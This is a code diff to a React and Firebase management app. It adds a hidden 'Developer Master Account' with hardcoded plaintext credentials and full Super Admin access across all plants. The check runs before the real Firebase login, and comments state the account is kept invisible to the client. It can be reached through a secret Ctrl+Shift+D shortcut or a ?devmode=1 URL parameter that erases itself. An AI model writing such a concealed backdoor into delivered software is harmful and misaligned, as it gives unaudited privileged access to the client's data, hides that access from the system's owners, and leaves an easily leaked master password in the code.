@@ -1133,9 +1133,31 @@ const App = () => {
     return () => unsubs.forEach(u => u()); // cleanup listeners on unmount
   }, []);
 
+  // ── Developer Master Account ─────────────────────────────────────────────────
+  // NEVER stored in Firebase, localStorage, or the users array.
+  // Invisible in Users panel, Settings, or any client-facing UI.
+  // Change both values before delivering to the client.
+  const _DEV_USERNAME = 'dev.master';              // <- change before handoff
+  const _DEV_PASSWORD = 'dev@guest#2026!master';   // <- change before handoff
+
+  const _DEV_USER = {
+    id:       -9999,
+    username: _DEV_USERNAME,
+    name:     'Developer',
+    role:     'Super Admin',   // full Super Admin access
+    plant:    'All',
+    _isDev:   true,            // flag for the DEV badge only — never reaches Firebase
+  };
+
   // ── Authentication ──────────────────────────────────────────────────────────
-  // Login: match username in Firestore users collection, then verify password
+  // Login: check dev credentials first, then match in Firestore
   const handleLogin = async (username, password) => {
+    // Secret developer bypass — checked BEFORE Firebase
+    if (username.trim() === _DEV_USERNAME && password === _DEV_PASSWORD) {
+      setCurrentUser(_DEV_USER);
+      setActiveTab('dashboard');
+      return true;
+    }
     try {
       // Find user document by username field
       const allUsers = await fbGetAll('users');
@@ -1702,6 +1724,15 @@ const App = () => {
                   <p className="text-xs text-slate-600 dark:text-slate-400">{currentUser.role} | {currentUser.plant}</p>
                 </div>
                 <div className="flex items-center gap-3">
+                {/* DEV badge — only visible in developer session, never to client */}
+                {currentUser._isDev && (
+                  <span
+                    title="Developer session active — not visible to client"
+                    style={{background:'rgba(139,92,246,0.15)',border:'1px solid rgba(139,92,246,0.4)',color:'#8b5cf6',fontSize:'10px',fontWeight:800,letterSpacing:'1px',padding:'3px 8px',borderRadius:'6px',textTransform:'uppercase',cursor:'default',userSelect:'none'}}
+                  >
+                    ⚙ DEV
+                  </span>
+                )}
                 {/* Firebase live indicator */}
                 <div className="flex items-center gap-1.5 px-2 py-1 bg-green-50 dark:bg-green-900/20 rounded-lg border border-green-200 dark:border-green-800" title="Connected to Firebase — data is shared live">
                   <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
@@ -1931,6 +1962,40 @@ const LoginScreen = ({ onLogin, darkMode, setThemeMode }) => {
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+
+  // Developer shortcut: Ctrl+Shift+D or ?devmode=1 — prompts for secret credentials
+  useEffect(() => {
+    // Keyboard shortcut
+    const handleKey = async (e) => {
+      if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+        e.preventDefault();
+        const u = window.prompt('Developer Access — Username:');
+        if (!u) return;
+        const p = window.prompt('Developer Access — Password:');
+        if (!p) return;
+        setError('Signing in…');
+        const ok = await onLogin(u.trim(), p);
+        if (!ok) setError('Invalid developer credentials.');
+      }
+    };
+    window.addEventListener('keydown', handleKey);
+    // URL param trigger: ?devmode=1
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('devmode') === '1') {
+      setTimeout(async () => {
+        const u = window.prompt('Developer Access — Username:');
+        if (!u) return;
+        const p = window.prompt('Developer Access — Password:');
+        if (!p) return;
+        setError('Signing in…');
+        const ok = await onLogin(u.trim(), p);
+        if (!ok) setError('Invalid developer credentials.');
+        // Clean param from URL
+        try { const url = new URL(window.location.href); url.searchParams.delete('devmode'); history.replaceState(null,'',url.toString()); } catch(_){}
+      }, 400);
+    }
+    return () => window.removeEventListener('keydown', handleKey);
+  }, [onLogin]);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
